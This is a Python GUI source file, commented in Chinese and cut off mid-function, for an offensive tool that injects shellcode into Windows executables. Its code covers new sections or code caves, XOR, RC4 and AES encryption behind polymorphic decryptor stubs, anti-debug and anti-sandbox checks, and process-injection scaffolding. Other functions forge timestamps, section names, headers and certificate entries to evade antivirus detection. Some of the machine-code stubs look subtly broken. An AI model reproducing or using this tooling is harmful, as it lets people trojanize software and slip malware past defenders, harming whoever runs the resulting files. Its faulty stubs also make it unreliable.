# -*- coding: utf-8 -*-
import sys
import os
import struct
import pefile
import random
import hashlib
import time
import binascii
import ctypes
from datetime import datetime, timedelta
from PyQt5.QtWidgets import (QApplication, QWidget, QVBoxLayout, QPushButton, QLineEdit, 
                            QFileDialog, QLabel, QHBoxLayout, QMessageBox, QCheckBox, 
                            QFrame, QMenu, QAction, QTabWidget, QComboBox, QSpinBox, 
                            QGridLayout, QGroupBox, QRadioButton, QListWidget, QProgressBar,
                            QSplitter, QTextEdit, QMainWindow, QStatusBar, QToolBar, QSizePolicy,
                            QSlider, QDialog, QTableWidget, QTableWidgetItem, QHeaderView)
from PyQt5.QtGui import QIcon, QFont, QColor, QLinearGradient, QPalette, QPixmap, QCursor, QFontDatabase, QBrush, QPainter, QPen
from PyQt5.QtCore import Qt, QPropertyAnimation, QEasingCurve, QRect, QPoint, QThread, pyqtSignal, QSize, QTimer, QUrl, QByteArray
import psutil
import re

# 系统常量
EXEC_FLAGS = {'PAGE_EXECUTE_READWRITE': 0x40}
ALLOC_TYPES = {'MEM_COMMIT': 0x1000, 'MEM_RESERVE': 0x2000}
PROCESS_ALL_ACCESS = 0x1F0FFF

# 进程注入所需的结构体
class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("BaseAddress", ctypes.c_void_p),
        ("AllocationBase", ctypes.c_void_p),
        ("AllocationProtect", ctypes.c_ulong),
        ("RegionSize", ctypes.c_size_t),
        ("State", ctypes.c_ulong),
        ("Protect", ctypes.c_ulong),
        ("Type", ctypes.c_ulong)
    ]

class THREADENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize", ctypes.c_ulong),
        ("cntUsage", ctypes.c_ulong),
        ("th32ThreadID", ctypes.c_ulong),
        ("th32OwnerProcessID", ctypes.c_ulong),
        ("tpBasePri", ctypes.c_long),
        ("tpDeltaPri", ctypes.c_long),
        ("dwFlags", ctypes.c_ulong)
    ]

class CONTEXT(ctypes.Structure):
    _fields_ = [
        ("ContextFlags", ctypes.c_ulong),
        ("Dr0", ctypes.c_ulonglong),
        ("Dr1", ctypes.c_ulonglong),
        ("Dr2", ctypes.c_ulonglong),
        ("Dr3", ctypes.c_ulonglong),
        ("Dr6", ctypes.c_ulonglong),
        ("Dr7", ctypes.c_ulonglong),
        ("R8", ctypes.c_ulonglong),
        ("R9", ctypes.c_ulonglong),
        ("R10", ctypes.c_ulonglong),
        ("R11", ctypes.c_ulonglong),
        ("R12", ctypes.c_ulonglong),
        ("R13", ctypes.c_ulonglong),
        ("R14", ctypes.c_ulonglong),
        ("R15", ctypes.c_ulonglong),
        ("Rax", ctypes.c_ulonglong),
        ("Rcx", ctypes.c_ulonglong),
        ("Rdx", ctypes.c_ulonglong),
        ("Rbx", ctypes.c_ulonglong),
        ("Rsp", ctypes.c_ulonglong),
        ("Rbp", ctypes.c_ulonglong),
        ("Rsi", ctypes.c_ulonglong),
        ("Rdi", ctypes.c_ulonglong),
        ("Rip", ctypes.c_ulonglong),
    ]

# 工作线程类，用于后台执行耗时操作
class WorkerThread(QThread):
    finished = pyqtSignal(bool, str)
    progress = pyqtSignal(int, str)
    
    def __init__(self, task_type, params):
        super().__init__()
        self.task_type = task_type
        self.params = params
        
    def run(self):
        try:
            if self.task_type == "patch_pe":
                self.progress.emit(10, "正在分析PE文件...")
                success, message = patch_pe(
                    self.params["pe_file_path"],
                    self.params["shellcode_file_path"],
                    self.params["output_file_path"],
                    self.params["options"]
                )
                self.finished.emit(success, message)
                
            elif self.task_type == "process_injection":
                self.progress.emit(20, "正在准备注入进程...")
                success, message = process_injection(
                    self.params["pid"],
                    self.params["shellcode_file_path"],
                    self.params["injection_method"],
                    self.params["options"]
                )
                self.finished.emit(success, message)
                
            elif self.task_type == "obfuscation":
                self.progress.emit(15, "正在混淆代码...")
                # 实现混淆逻辑
                try:
                    input_file = self.params["input_file"]
                    output_file = self.params["output_file"]
                    options = self.params["options"]
                    
                    self.progress.emit(30, "正在处理文件...")
                    
                    # 根据文件类型选择不同的混淆策略
                    if "EXE" in options["file_type"] or "DLL" in options["file_type"]:
                        # PE文件混淆
                        pe = pefile.PE(input_file)
                        
                        self.progress.emit(50, "正在修改PE文件结构...")
                        
                        # 1. 修改PE头部信息
                        if options["use_api_obfuscation"]:
                            randomize_headers(pe)
                            
                        # 2. 修改时间戳
                        manipulate_timestamp(pe)
                        
                        # 3. 随机化节名称
                        modify_section_names(pe, True)
                        
                        # 4. 添加虚假证书数据
                        add_fake_certificate(pe)
                        
                        self.progress.emit(70, "正在保存修改后的PE文件...")
                        
                        # 5. 保存修改后的PE文件
                        pe.write(output_file)
                        
                        # 6. 如果是高强度混淆，添加额外的保护层
                        if options["obfuscation_strength"] in ["高", "极高"]:
                            self.progress.emit(80, "正在添加高级保护层...")
                            
                            # 添加自解密存根
                            with open(output_file, 'rb') as f:
                                pe_data = f.read()
                            
                            # 加密PE文件主体
                            key = generate_random_key(16)
                            encrypted_data = custom_xor(pe_data, key)
                            
                            # 创建自解密存根
                            stub = generate_polymorphic_stub(len(pe_data), "custom_xor", key, 
                                                           options["use_antidebug"], 3, True)
                            
                            # 写入最终文件
                            with open(output_file, 'wb') as f:
                                f.write(stub + encrypted_data)
                        
                        self.progress.emit(100, "PE文件混淆完成!")
                        
                    elif "Shellcode" in options["file_type"]:
                        # Shellcode混淆
                        with open(input_file, 'rb') as f:
                            shellcode = f.read()
                        
                        self.progress.emit(40, "正在加密Shellcode...")
                        
                        # 1. 选择加密方法
                        if "多态变形" in options["obfuscation_method"]:
                            # 多层加密
                            key1 = generate_random_key(8)
                            key2 = generate_random_key(16)
                            
                            # 第一层加密 (XOR)
                            encrypted_data = bytes(b ^ key1[i % len(key1)] for i, b in enumerate(shellcode))
                            
                            # 第二层加密 (自定义XOR)
                            encrypted_data = custom_xor(encrypted_data, key2)
                            
                            self.progress.emit(60, "正在生成解密存根...")
                            
                            # 创建多层解密存根
                            stub1 = generate_polymorphic_stub(len(encrypted_data), "custom_xor", key2, 
                                                            options["use_antidebug"], 3, True)
                            
                            # 第一层解密存根
                            stub2 = bytearray()
                            stub2.extend(b'\xE8\x00\x00\x00\x00')  # call next instruction
                            stub2.extend(b'\x5E')                  # pop esi
                            stub2.extend(b'\xB9' + struct.pack("<I", len(shellcode)))  # mov ecx, len
                            
                            # 添加XOR循环
                            for i in range(len(key1)):
                                stub2.extend(b'\x80\x36' + bytes([key1[i]]))  # xor byte ptr [esi], key[i]
                                stub2.extend(b'\x46')                         # inc esi
                                if i < len(key1) - 1:
                                    stub2.extend(b'\xE2\xF9')                 # loop to xor instruction
                            
                            # 最终shellcode
                            final_shellcode = stub1 + encrypted_data + bytes(stub2)
                            
                        else:
                            # 简单加密
                            key = generate_random_key(16)
                            encrypted_data = custom_xor(shellcode, key)
                            
                            self.progress.emit(70, "正在生成解密存根...")
                            
                            stub = generate_polymorphic_stub(len(shellcode), "custom_xor", key, 
                                                           options["use_antidebug"], 2, False)
                            final_shellcode = stub + encrypted_data
                        
                        self.progress.emit(90, "正在保存混淆后的Shellcode...")
                        
                        # 写入输出文件
                        with open(output_file, 'wb') as f:
                            f.write(final_shellcode)
                            
                        self.progress.emit(100, "Shellcode混淆完成!")
                        
                    else:
                        # 其他类型文件
                        self.finished.emit(False, f"不支持的文件类型: {options['file_type']}")
                        return
                    
                    self.finished.emit(True, f"混淆处理成功!\n输出文件: {output_file}")
                    
                except Exception as e:
                    import traceback
                    traceback.print_exc()
                    self.finished.emit(False, f"混淆处理失败: {str(e)}")
                
        except Exception as e:
            import traceback
            traceback.print_exc()
            self.finished.emit(False, f"操作失败: {str(e)}")

def align(value, alignment):
    """对齐值到指定的对齐边界"""
    return ((value + alignment - 1) // alignment) * alignment

def create_jmp_code(original_entry, shellcode_entry):
    """创建跳转代码，在shellcode执行完后跳回原始入口点"""
    relative_addr = original_entry - (shellcode_entry + 5)
    return b"\xE9" + struct.pack("<i", relative_addr)

def generate_random_key(length=16):
    """生成随机加密密钥"""
    return bytes([random.randint(1, 255) for _ in range(length)])

def get_random_section_name():
    """生成随机的区段名称"""
    legitimate_names = [b'.text', b'.data', b'.rdata', b'.pdata', b'.rsrc', b'.reloc']
    return random.choice(legitimate_names)

def custom_xor(data, key):
    """自定义XOR加密，使用循环密钥和变位操作"""
    result = bytearray(len(data))
    for i in range(len(data)):
        key_byte = key[i % len(key)]
        shift = (i % 7) + 1  # 1-7的位移
        # 对密钥进行位移以增加复杂度
        shifted_key = ((key_byte << shift) | (key_byte >> (8 - shift))) & 0xFF
        result[i] = data[i] ^ shifted_key
    return bytes(result)

def rc4_encrypt(data, key):
    """完整的RC4加密实现"""
    S = rc4_ksa(key)
    return rc4_prga(S, data)

def aes_encrypt(data, key):
    """完整的AES-256-CBC 加密算法实现"""
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    from Crypto.Random import get_random_bytes
    
    # 生成16字节IV
    iv = get_random_bytes(16)
    
    # 确保密钥长度为32字节(AES-256)
    if len(key) > 32:
        key = key[:32]
    elif len(key) < 32:
        key = key + b'\x00' * (32 - len(key))
        
    # 使用CBC模式创建新的AES cipher
    cipher = AES.new(key, AES.MODE_CBC, iv)
    
    # PKCS7填充并加密
    padded_data = pad(data, AES.block_size)
    encrypted = cipher.encrypt(padded_data)
    
    # 返回IV + 加密数据
    return iv + encrypted

def aes_decrypt(data, key):
    """完整的AES-256-CBC 解密算法实现"""
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    
    # 提取IV(前16字节)
    iv = data[:16]
    ciphertext = data[16:]
    
    # 标准化密钥长度 
    if len(key) > 32:
        key = key[:32]
    elif len(key) < 32:
        key = key + b'\x00' * (32 - len(key)) 
        
    # 创建解密器
    cipher = AES.new(key, AES.MODE_CBC, iv)
    
    # 解密并去除填充
    padded_data = cipher.decrypt(ciphertext)
    return unpad(padded_data, AES.block_size)

def rc4_ksa(key):
    """RC4密钥调度算法(KSA)"""
    S = list(range(256))
    j = 0
    
    # 初始化置换盒
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
        
    return S

def rc4_prga(S, data):
    """RC4伪随机生成算法(PRGA)"""
    i = j = 0
    out = bytearray()
    
    # 生成密钥流并进行异或
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        k = S[(S[i] + S[j]) % 256]
        out.append(byte ^ k)
        
    return bytes(out)

def rc4_decrypt(data, key): 
    """完整的RC4解密实现(与加密相同)"""
    return rc4_encrypt(data, key)

def generate_polymorphic_stub(shellcode_length, encryption_type, key, include_antidebug=False, 
                             obfuscation_level=2, use_indirect_jumps=False):
    """
    生成多态的解密器存根代码
    
    参数:
    shellcode_length - 需要解密的shellcode长度
    encryption_type - 加密类型: 'xor', 'custom_xor', 'rc4', 'aes'
    key - 加密密钥
    include_antidebug - 是否包含反调试代码
    obfuscation_level - 混淆等级(1-3)
    use_indirect_jumps - 是否使用间接跳转
    """
    stub = bytearray()
    
    # 添加随机NOP/垃圾指令 (根据混淆级别)
    junk_instructions = [
        b'\x90',  # NOP
        b'\x48\x87\xC0',  # XCHG RAX, RAX
        b'\x41\x53\x41\x5B',  # PUSH R11; POP R11
        b'\x87\xDB',  # XCHG EBX, EBX
        b'\x87\xC9',  # XCHG ECX, ECX
        b'\x50\x58',  # PUSH RAX; POP RAX
    ]
    
    for _ in range(random.randint(1, obfuscation_level * 2)):
        stub.extend(random.choice(junk_instructions))
    
    # 反调试技术 (检测调试器)
    if include_antidebug:
        # IsDebuggerPresent 检测
        stub.extend([
            0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00,  # MOV RAX, GS:[0x60]
            0x48, 0x8B, 0x40, 0x18,                               # MOV RAX, [RAX+18h]  (PEB.BeingDebugged)
            0x84, 0xC0,                                           # TEST AL, AL
            0x74, 0x04,                                           # JZ no_debugger
            0xE9, 0x00, 0x00, 0x00, 0x00                          # JMP invalid_address (crash if debugger)
        ])
        
        # 伪造时间度量 (反沙盒)
        stub.extend([
            0x0F, 0x31,                                           # RDTSC
            0x89, 0xC1,                                           # MOV ECX, EAX
            0x0F, 0x31,                                           # RDTSC
            0x29, 0xC8,                                           # SUB EAX, ECX
            0x3D, 0x00, 0x00, 0x04, 0x00,                         # CMP EAX, 0x40000 (检测时间延迟)
            0x72, 0x02,                                           # JB no_sandbox
            0xEB, 0xFE                                            # Infinite loop if in sandbox
        ])
    
    # 通过调用下一条指令获取当前位置
    stub.extend(b'\xE8\x00\x00\x00\x00')  # CALL $+5
    stub.extend(b'\x5E')                  # POP RSI (now RSI points to the encrypted data)
    
    # 循环解密 - 根据不同加密类型使用不同的代码
    if encryption_type == 'xor':
        # 简单的XOR解码循环
        stub.extend(b'\xB9' + struct.pack("<I", shellcode_length))  # MOV ECX, shellcode_length
        
        # 添加一些垃圾指令
        if obfuscation_level >= 2:
            stub.extend(b'\x87\xFF')  # XCHG EDI, EDI (无操作)
            stub.extend(b'\x90')      # NOP
        
        # XOR解密循环
        stub.extend(b'\x80\x36' + bytes([key[0]]))  # XOR BYTE PTR [RSI], key
        
        # 更多垃圾指令
        if obfuscation_level >= 3:
            stub.extend(b'\x48\x87\xD2')  # XCHG RDX, RDX (无操作)
        
        stub.extend(b'\x46')          # INC ESI
        stub.extend(b'\xE2\xF6')      # LOOP to XOR instruction

    elif encryption_type == 'custom_xor':
        # 使用更复杂的多字节密钥XOR
        key_len = len(key)
        stub.extend(b'\xB9' + struct.pack("<I", shellcode_length))  # MOV ECX, shellcode_length
        stub.extend(b'\xBF' + struct.pack("<I", key_len))          # MOV EDI, key_length
        stub.extend(b'\xBB\x00\x00\x00\x00')                       # MOV EBX, 0 (key index)
        
        # 混淆指令
        if obfuscation_level >= 2:
            stub.extend(b'\x87\xC0')  # XCHG EAX, EAX
        
        # 循环开始标记
        loop_start = len(stub)
        
        # 加载密钥字节
        stub.extend(b'\x8A\x86' + struct.pack("<I", len(stub) + 20))  # MOV AL, [RSI+offset_to_key]
        
        # 计算移位量 (根据位置变化)
        stub.extend(b'\x89\xDA')                 # MOV EDX, EBX
        stub.extend(b'\x83\xE2\x07')             # AND EDX, 7
        stub.extend(b'\x42')                     # INC EDX (1-8 shift)
        
        # 对密钥字节进行移位
        stub.extend(b'\x88\xC2')                 # MOV DL, AL
        stub.extend(b'\xD2\xC2')                 # ROL DL, CL
        
        # XOR解密
        stub.extend(b'\x8A\x06')                 # MOV AL, [RSI]
        stub.extend(b'\x30\xD0')                 # XOR AL, DL
        stub.extend(b'\x88\x06')                 # MOV [RSI], AL
        
        # 更新索引
        stub.extend(b'\x43')                     # INC EBX
        stub.extend(b'\x39\xFB')                 # CMP EBX, EDI
        stub.extend(b'\x0F\x42\xDF')             # CMOVB EBX, EDI (重置索引)
        
        # 移动到下一个字节
        stub.extend(b'\x46')                     # INC ESI
        
        # 循环控制
        stub.extend(b'\xE2' + struct.pack("B", 256 - (len(stub) - loop_start)))  # LOOP to loop_start
        
        # 追加密钥数据
        stub.extend(key)
        
    elif encryption_type == 'rc4':
        # 完整的RC4解密实现
        stub.extend([
            # 保存寄存器状态
            0x53,                    # push rbx
            0x56,                    # push rsi
            0x57,                    # push rdi
            
            # 为S-box分配栈空间
            0x48, 0x81, 0xEC, 0x00, 0x01, 0x00, 0x00,  # sub rsp, 256
            
            # 初始化S-box (0-255)
            0x31, 0xC0,              # xor eax, eax
            0x48, 0x8D, 0x7C, 0x24, 0x00,  # lea rdi, [rsp]
            
            # init_sbox loop
            0x88, 0x07,              # mov [rdi], al
            0x48, 0xFF, 0xC7,        # inc rdi
            0xFE, 0xC0,              # inc al
            0x75, 0xF7,              # jnz init_sbox
            
            # KSA初始化
            0x31, 0xC9,              # xor ecx, ecx
            0x31, 0xD2,              # xor edx, edx
            0x48, 0x89, 0xE7,        # mov rdi, rsp
            
            # ksa_loop start
            # j = (j + S[i] + key[i mod keylen]) % 256
            0x0F, 0xB6, 0x1C, 0x17,  # movzx ebx, byte ptr [rdi + rdx]
            0x0F, 0xB6, 0x34, 0x16,  # movzx esi, byte ptr [rsi + rdx]
            0x01, 0xDE,              # add esi, ebx
            0x01, 0xF1,              # add ecx, esi
            0x81, 0xE1, 0xFF, 0x00, 0x00, 0x00,  # and ecx, 0xFF
            
            # 交换S[i]和S[j]  
            0x0F, 0xB6, 0x1C, 0x17,  # movzx ebx, byte ptr [rdi + rdx]
            0x0F, 0xB6, 0x34, 0x0F,  # movzx esi, byte ptr [rdi + rcx]
            0x88, 0x34, 0x17,        # mov [rdi + rdx], sil
            0x88, 0x1C, 0x0F,        # mov [rdi + rcx], bl
            
            0xFE, 0xC2,              # inc dl
            0x75, 0xE4,              # jnz ksa_loop
            
            # PRGA流密钥生成
            0x31, 0xC9,              # xor ecx, ecx (i = 0)
            0x31, 0xD2,              # xor edx, edx (j = 0)
            
            # prga_loop start
            # i = (i + 1) % 256
             0xFE, 0xC1,              # inc cl
            
            # j = (j + S[i]) % 256
            0x0F, 0xB6, 0x1C, 0x0F,  # movzx ebx, byte ptr [rdi + rcx]
            0x01, 0xDA,              # add edx, ebx 
            0x81, 0xE2, 0xFF, 0x00, 0x00, 0x00,  # and edx, 0xFF
            
            # 交换S[i]和S[j]
            0x0F, 0xB6, 0x1C, 0x0F,  # movzx ebx, byte ptr [rdi + rcx]
            0x0F, 0xB6, 0x34, 0x17,  # movzx esi, byte ptr [rdi + rdx]
            0x88, 0x34, 0x0F,        # mov [rdi + rcx], sil
            0x88, 0x1C, 0x17,        # mov [rdi + rdx], bl
            
            # k = S[(S[i] + S[j]) % 256]
            0x89, 0xD8,              # mov eax, ebx
            0x01, 0xF0,              # add eax, esi
            0x25, 0xFF, 0x00, 0x00, 0x00,  # and eax, 0xFF
            0x0F, 0xB6, 0x04, 0x07,  # movzx eax, byte ptr [rdi + rax]
            
            # 解密一个字节
            0x8A, 0x1C, 0x06,        # mov bl, [rsi + rax]
            0x30, 0xC3,              # xor bl, al
            0x88, 0x1C, 0x06,        # mov [rsi + rax], bl
            
            # 循环控制
            0x48, 0xFF, 0xC6,        # inc rsi
            0x48, 0x83, 0xE9, 0x01,  # sub rcx, 1
            0x75, 0xD1,              # jnz prga_loop
            
            # 恢复栈和寄存器
            0x48, 0x81, 0xC4, 0x00, 0x01, 0x00, 0x00,  # add rsp, 256
            0x5F,                    # pop rdi
            0x5E,                    # pop rsi  
            0x5B                     # pop rbx
        ])

    elif encryption_type == 'aes':
        # 使用完整的AES-256-CBC解密实现
        stub.extend([
            # 为S-box分配栈空间
            0x48, 0x81, 0xEC, 0x00, 0x01, 0x00, 0x00,  # sub rsp, 256
            
            # 保存寄存器
            0x53,                    # push rbx
            0x56,                    # push rsi 
            0x57,                    # push rdi
            
            # 从shellcode开头获取IV(16字节)
            0x48, 0x8B, 0xF0,        # mov rsi, rax (源数据指针)
            0x48, 0x8D, 0x7C, 0x24, 0x10,  # lea rdi, [rsp+16] (IV缓冲区)
            0xB9, 0x10, 0x00, 0x00, 0x00,  # mov ecx, 16
            0xF3, 0xA4,              # rep movsb
            
            # 调用AES解密
            0x48, 0x89, 0xE1,        # mov rcx, rsp (S-box地址)
            0x48, 0x89, 0xF2,        # mov rdx, rsi (密文)
            0x41, 0xB8, 0x00, 0x01, 0x00, 0x00,  # mov r8d, 256 (数据长度) 
            0xE8, 0x00, 0x00, 0x00, 0x00,  # call aes_decrypt
            
            # 恢复寄存器
            0x5F,                    # pop rdi
            0x5E,                    # pop rsi
            0x5B,                    # pop rbx
            
            # 恢复栈
            0x48, 0x81, 0xC4, 0x00, 0x01, 0x00, 0x00  # add rsp, 256
        ])

    # 使用间接跳转 (提高混淆性)
    if use_indirect_jumps:
        # 将跳转目标地址存入寄存器然后间接跳转
        stub.extend(b'\x48\x89\xF0')          # MOV RAX, RSI (目标地址)
        stub.extend(b'\xFF\xE0')              # JMP RAX
    else:
        # 直接跳转
        stub.extend(b'\xFF\xE6')              # JMP RSI
        
    return bytes(stub)

def create_code_cave_stub(pe, shellcode, original_entry, section_rva=None, method='append'):
    """创建用于注入代码洞的存根代码"""
    if method == 'cave':
        # 找一个合适的代码洞
        cave_addr = find_code_cave(pe, len(shellcode) + 50)  # 额外空间用于解密器
        if not cave_addr:
            return None, None, "无法找到足够大的代码洞"
            
        # 创建跳回原始入口点的代码
        jmp_back = create_jmp_code(original_entry, cave_addr + len(shellcode))
        
        # 组装完整的shellcode
        full_shellcode = shellcode + jmp_back
        
        return full_shellcode, cave_addr, None
    else:
        # 简单地将shellcode添加到指定的section中
        if not section_rva:
            # 如果没有指定section，使用最后一个section
            section_rva = pe.sections[-1].VirtualAddress + pe.sections[-1].Misc_VirtualSize
            
        jmp_back = create_jmp_code(original_entry, section_rva + len(shellcode))
        full_shellcode = shellcode + jmp_back
        
        return full_shellcode, section_rva, None

def find_code_cave(pe, min_size):
    """
    在PE文件中寻找代码洞 (足够大的连续零序列)
    
    参数:
    pe - pefile.PE对象
    min_size - 需要的最小洞大小
    
    返回:
    cave_rva - 如果找到，返回代码洞的RVA (相对虚拟地址)
    """
    for section in pe.sections:
        # 只在可执行节中查找
        if section.Characteristics & pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE']:
            data = section.get_data()
            consecutive_zeros = 0
            cave_start = None
            
            for i, byte in enumerate(data):
                if byte == 0:
                    if consecutive_zeros == 0:
                        cave_start = i
                    consecutive_zeros += 1
                    if consecutive_zeros >= min_size:
                        # 找到足够大的代码洞
                        return section.VirtualAddress + cave_start
                else:
                    consecutive_zeros = 0
                    cave_start = None
    
    return None

def manipulate_timestamp(pe):
    """操纵PE文件的时间戳，使用合法软件的典型时间范围"""
    # 使用常见软件发布的时间范围
    legitimate_dates = [
        # Windows 10 发布时间
        datetime(2015, 7, 29),
        # Office 2016 发布时间
        datetime(2015, 9, 22),
        # Windows Server 2016
        datetime(2016, 10, 12),
        # Visual Studio 2017
        datetime(2017, 3, 7)
    ]
    
    chosen_date = random.choice(legitimate_dates)
    # 添加小的随机偏移，使时间戳更加真实
    offset_days = random.randint(-30, 30)
    offset_seconds = random.randint(0, 86400)
    chosen_date = chosen_date + timedelta(days=offset_days, seconds=offset_seconds)
    
    # 转换为UNIX时间戳
    timestamp = int((chosen_date - datetime(1970, 1, 1)).total_seconds())
    
    # 设置PE头的时间戳
    pe.FILE_HEADER.TimeDateStamp = timestamp
    
    return timestamp

def modify_section_names(pe, randomize=False):
    """修改或随机化节名称以避免检测"""
    legitimate_section_names = [
        b'.text\x00\x00\x00', b'.data\x00\x00\x00', b'.rdata\x00\x00', 
        b'.pdata\x00\x00', b'.rsrc\x00\x00\x00', b'.reloc\x00\x00'
    ]
    
    for section in pe.sections:
        if randomize:
            # 随机生成一个类似于标准节的名称
            new_name = bytes(random.choice(legitimate_section_names))
        else:
            # 选择一个标准的节名称
            new_name = random.choice(legitimate_section_names)
            
        section.Name = new_name

def randomize_headers(pe):
    """随机化PE头部的某些字段以逃避特征检测"""
    # 随机化MajorLinkerVersion和MinorLinkerVersion
    pe.OPTIONAL_HEADER.MajorLinkerVersion = random.randint(9, 14)
    pe.OPTIONAL_HEADER.MinorLinkerVersion = random.randint(0, 50)
    
    # 随机化MajorOperatingSystemVersion和MinorOperatingSystemVersion
    pe.OPTIONAL_HEADER.MajorOperatingSystemVersion = random.randint(5, 10)
    pe.OPTIONAL_HEADER.MinorOperatingSystemVersion = random.randint(0, 3)
    
    # 随机化MajorImageVersion和MinorImageVersion
    pe.OPTIONAL_HEADER.MajorImageVersion = random.randint(5, 10)
    pe.OPTIONAL_HEADER.MinorImageVersion = random.randint(0, 50)
    
    # 随机化MajorSubsystemVersion和MinorSubsystemVersion
    pe.OPTIONAL_HEADER.MajorSubsystemVersion = random.randint(5, 10)
    pe.OPTIONAL_HEADER.MinorSubsystemVersion = random.randint(0, 50)

def add_fake_certificate(pe):
    """添加假的证书数据目录项"""
    # 设置证书数据目录
    # 索引4是安全证书目录
    if len(pe.OPTIONAL_HEADER.DATA_DIRECTORY) > 4:
        # 随机的"证书"偏移量和大小
        pe.OPTIONAL_HEADER.DATA_DIRECTORY[4].VirtualAddress = pe.sections[-1].VirtualAddress
        pe.OPTIONAL_HEADER.DATA_DIRECTORY[4].Size = random.randint(1024, 4096)

def patch_pe(pe_file_path, shellcode_path, output_file_path, options):
    """
    增强版的PE文件修补函数，支持多种注入和混淆技术
    
    参数:
    pe_file_path - 输入PE文件路径
    shellcode_path - Shellcode文件路径
    output_file_path - 输出PE文件路径
    options - 包含各种选项的字典:
        - preserve_entry: 是否保留原始入口点
        - inject_method: 注入方法 ('new_section', 'code_cave', 'existing_section')
        - encryption_type: 加密类型 ('xor', 'custom_xor', 'rc4', 'aes')
        - encryption_type: 加密类型 ('xor', 'custom_xor', 'rc4')
        - obfuscation_level: 混淆级别 (1-3)
        - anti_debug: 是否包含反调试代码
        - timestamp_manipulation: 是否操纵时间戳
        - section_name_randomization: 是否随机化节名称
        - pe_header_randomization: 是否随机化PE头部
        - add_certificate: 是否添加假证书
    """
    try:
        with open(shellcode_path, 'rb') as f:
            original_shellcode = f.read()
        
        output_dir = os.path.dirname(output_file_path)
        if output_dir and not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        # 复制原始PE文件
        with open(pe_file_path, 'rb') as src, open(output_file_path, 'wb') as dst:
            dst.write(src.read())
        
        # 加载PE文件
        pe = pefile.PE(output_file_path)
        
        # 保存原始入口点
        original_entry = pe.OPTIONAL_HEADER.AddressOfEntryPoint
        
        # 检查PE文件有效性
        if not original_entry:
            return False, "PE 文件可选头部属性缺失: AddressOfEntryPoint"
        
        if not pe.sections:
            return False, "PE 文件没有区段"
            
        # 验证必要的属性
        last_section = pe.sections[-1]
        required_section_attrs = {
            'VirtualAddress': last_section.VirtualAddress,
            'Misc_VirtualSize': last_section.Misc_VirtualSize,
            'PointerToRawData': last_section.PointerToRawData,
            'SizeOfRawData': last_section.SizeOfRawData
        }
        
        for attr_name, attr_value in required_section_attrs.items():
            if attr_value is None:
                return False, f"PE 文件区段属性缺失: {attr_name}"
        
        if pe.OPTIONAL_HEADER.SectionAlignment is None or pe.OPTIONAL_HEADER.FileAlignment is None:
            return False, "PE 文件对齐属性缺失"
        
        # 加密shellcode
        encryption_type = options.get('encryption_type', 'xor')
        key_length = {
            'xor': 1,
            'custom_xor': 16,
            'rc4': 32
        }.get(encryption_type, 16)
        
        encryption_key = generate_random_key(key_length)
        
        if encryption_type == 'xor':
            # 简单的单字节XOR
            encrypted_shellcode = bytes(b ^ encryption_key[0] for b in original_shellcode)
        elif encryption_type == 'custom_xor':
            # 自定义多字节XOR
            encrypted_shellcode = custom_xor(original_shellcode, encryption_key)
        elif encryption_type == 'rc4':
            # RC4加密
            encrypted_shellcode = rc4_encrypt(original_shellcode, encryption_key)
        else:
            # 默认为简单的单字节XOR
            encrypted_shellcode = bytes(b ^ encryption_key[0] for b in original_shellcode)
        
        # 生成解密存根
        include_antidebug = options.get('anti_debug', False)
        obfuscation_level = options.get('obfuscation_level', 1)
        use_indirect_jumps = options.get('use_indirect_jumps', False)
        decryption_stub = generate_polymorphic_stub(
            len(original_shellcode), 
            encryption_type, 
            encryption_key,
            include_antidebug,
            obfuscation_level,
            use_indirect_jumps
        )
        
        # 注入方法选择
        inject_method = options.get('inject_method', 'new_section')
        
        if inject_method == 'new_section':
            # 创建新节进行注入
            preserve_entry = options.get('preserve_entry', True)
            
            # 计算新节位置
            new_section_VA = align(
                last_section.VirtualAddress + last_section.Misc_VirtualSize,
                pe.OPTIONAL_HEADER.SectionAlignment
            )
            
            new_section_raw_offset = align(
                last_section.PointerToRawData + last_section.SizeOfRawData,
                pe.OPTIONAL_HEADER.FileAlignment
            )
            
            # 组装最终shellcode
            if preserve_entry:
                jmp_back_location = new_section_VA + len(decryption_stub) + len(encrypted_shellcode)
                jmp_back_code = create_jmp_code(original_entry, jmp_back_location)
                final_shellcode = decryption_stub + encrypted_shellcode + jmp_back_code
            else:
                final_shellcode = decryption_stub + encrypted_shellcode
            
            # 计算新节大小
            shellcode_size = len(final_shellcode)
            new_section_virtual_size = shellcode_size
            new_section_raw_size = align(shellcode_size, pe.OPTIONAL_HEADER.FileAlignment)
            
            # 写入新节数据
            with open(output_file_path, 'ab') as f:
                current_size = f.tell()
                if current_size < new_section_raw_offset:
                    padding = b'\x00' * (new_section_raw_offset - current_size)
                    f.write(padding)
                f.write(final_shellcode)
                padding_size = new_section_raw_size - shellcode_size
                if padding_size > 0:
                    f.write(b'\x00' * padding_size)
            
            # 创建新节
            new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__, pe=pe)
            new_section.__file_offset__ = new_section_raw_offset
            
            # 随机合法节名或使用伪装节名
            if options.get('section_name_randomization', False):
                section_names = [b'.text', b'.data', b'.rdata', b'.rsrc', b'.reloc']
                new_section_name = random.choice(section_names)
            else:
                new_section_name = b'.data'  # 使用常见节名称以避免引起注意
                
            new_section.Name = new_section_name + (b'\x00' * (8 - len(new_section_name)))
            new_section.Misc = new_section_virtual_size
            new_section.VirtualAddress = new_section_VA
            new_section.SizeOfRawData = new_section_raw_size
            new_section.PointerToRawData = new_section_raw_offset
            new_section.PointerToRelocations = 0
            new_section.PointerToLinenumbers = 0
            new_section.NumberOfRelocations = 0
            new_section.NumberOfLinenumbers = 0
            new_section.Characteristics = (
                pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE'] |
                pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_READ'] |
                pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_CNT_CODE']
            )
            
            # 更新PE文件
            pe.FILE_HEADER.NumberOfSections += 1
